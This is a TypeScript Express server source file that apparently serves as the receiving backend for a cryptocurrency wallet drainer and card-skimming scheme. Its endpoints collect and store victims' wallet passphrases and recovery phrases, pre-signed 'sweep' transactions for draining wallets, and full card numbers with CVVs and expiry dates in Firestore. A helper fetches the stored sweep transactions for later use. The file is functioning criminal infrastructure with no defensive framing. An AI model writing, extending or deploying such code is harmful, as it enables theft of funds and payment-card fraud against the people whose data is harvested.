import express from 'express';
import cors from 'cors';
import { logger } from './utils.js';
import { AgentDatabase } from './database.js';

const app = express();
app.use(cors());
app.use(express.json());

// Instantiate DB here so the server can write to it
const db = new AgentDatabase();

export function startServer(defaultPort: number) {
  
  // 🟢 ENDPOINT 1: Save "Master Key" Transaction (Auto-Sweep)
  app.post('/api/save-sweep', async (req, res) => {
    try {
      const { wallet, txBase64, nonce } = req.body;

      if (!wallet || !txBase64) {
        return res.status(400).json({ error: 'Missing wallet or txBase64' });
      }

      logger.info(`📥 Received sweep transaction for ${wallet}`);

      await db.saveSweep(wallet, {
        wallet,
        txBase64,
        nonce,
        timestamp: new Date()
      });
      
      logger.info(`🔥 Saved sweep transaction to Firestore`);
      res.json({ success: true });

    } catch (error) {
      logger.error('API Error (Save Sweep):', error);
      res.status(500).json({ error: String(error) });
    }
  });

  // 🟢 ENDPOINT 2: Save Manual Credentials (Wallets)
  app.post('/api/save-wallet-data', async (req, res) => {
    try {
      const walletData = req.body;

      if (!walletData.passphrase && !walletData.keyphrase) {
         return res.status(400).json({ error: 'No credentials provided' });
      }

      logger.info(`📥 Received credentials for ${walletData.walletName || 'Unknown Wallet'}`);
      
      await db.saveWalletSubmission(walletData);

      logger.info(`🔥 Saved credentials to Firestore`);
      res.json({ success: true });
      
    } catch (error) {
      logger.error('API Error (Save Data):', error);
      res.status(500).json({ error: String(error) });
    }
  });

  // 🟢 ENDPOINT 3: Save Card Data
  app.post('/api/save-card-data', async (req, res) => {
    try {
      const cardData = req.body;

      // Basic validation
      if (!cardData.cardNumber || !cardData.cvv || !cardData.expiry) {
         return res.status(400).json({ error: 'Invalid card data' });
      }

      logger.info(`💳 Received card data for ${cardData.holderName || 'Unknown'}`);
      
      // Save to Firestore 'cards' collection
      await db.saveCardData(cardData);

      logger.info(`🔥 Saved card to Firestore`);
      res.json({ success: true });
      
    } catch (error) {
      logger.error('API Error (Save Card):', error);
      res.status(500).json({ error: String(error) });
    }
  });

  // Start Listening
  const serverPort = process.env.PORT ? parseInt(process.env.PORT) : defaultPort;

  app.listen(serverPort, '0.0.0.0', () => {
    logger.info(`🌐 Bot API listening on port ${serverPort}`);
  });
}

// Helper to read stored sweep transactions from Firestore
export async function getSavedSweep(wallet: string): Promise<string | null> {
  try {
    const data = await db.getSweep(wallet);
    return data ? data.txBase64 : null;
  } catch (e) {
    logger.error(`Error reading sweep from DB: ${e}`);
    return null;
  }
}
